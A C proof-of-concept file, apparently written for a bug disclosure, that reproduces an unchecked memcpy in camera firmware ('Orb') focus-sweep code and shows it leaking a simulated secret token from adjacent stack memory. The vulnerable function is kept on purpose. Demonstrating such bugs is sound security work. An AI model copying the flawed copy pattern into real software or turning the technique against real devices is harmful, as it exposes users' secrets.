#include <stdio.h>
#include <stdint.h>
#include <string.h>

#define MAX_NUMBER_OF_FOCUS_VALUES 200

// Simulated global state from ir_camera_system_hw.c
static int16_t global_focus_values[MAX_NUMBER_OF_FOCUS_VALUES];
static size_t global_num_focus_values;
static int use_focus_sweep_polynomial;

// The vulnerable function (as it was before the fix)
void ir_camera_system_set_focus_values_for_focus_sweep_hw_vulnerable(int16_t *focus_values, size_t num_focus_values)
{
    global_num_focus_values = num_focus_values;
    // BUG: Always copies 400 bytes (200 * int16_t) regardless of num_focus_values
    memcpy(global_focus_values, focus_values, sizeof(global_focus_values));
    use_focus_sweep_polynomial = 0;
}

int main() {
    printf("--- Orb Firmware OOB Read PoC ---\n");

    // Simulate memory layout in the runner thread
    struct {
        int16_t attacker_focus_values[1];
        char sensitive_data[398];
    } __attribute__((packed)) stack_frame;

    // Attacker provides only 1 focus value
    stack_frame.attacker_focus_values[0] = 0x1337;

    // Adjacent memory contains sensitive information
    strcpy(stack_frame.sensitive_data, "SECRET_TOKEN_LEAKED_FROM_STACK_MEMORY_ADJACENT_TO_PROTOBUF_BUFFER");

    printf("[+] Calling vulnerable function with 1 focus value...\n");
    ir_camera_system_set_focus_values_for_focus_sweep_hw_vulnerable(stack_frame.attacker_focus_values, 1);

    printf("[+] Content of global_focus_values after OOB read:\n");
    // Print the first few entries
    printf("    [0]: 0x%04x (Legitimate)\n", global_focus_values[0]);

    // Check for leaked data in the subsequent entries
    char *leaked_str = (char *)&global_focus_values[1];
    printf("    Leaked String: %s\n", leaked_str);

    if (strstr(leaked_str, "SECRET_TOKEN") != NULL) {
        printf("\n[!] SUCCESS: Detected leaked data from adjacent memory!\n");
    } else {
        printf("\n[?] No leak detected in this specific layout.\n");
    }

    return 0;
}
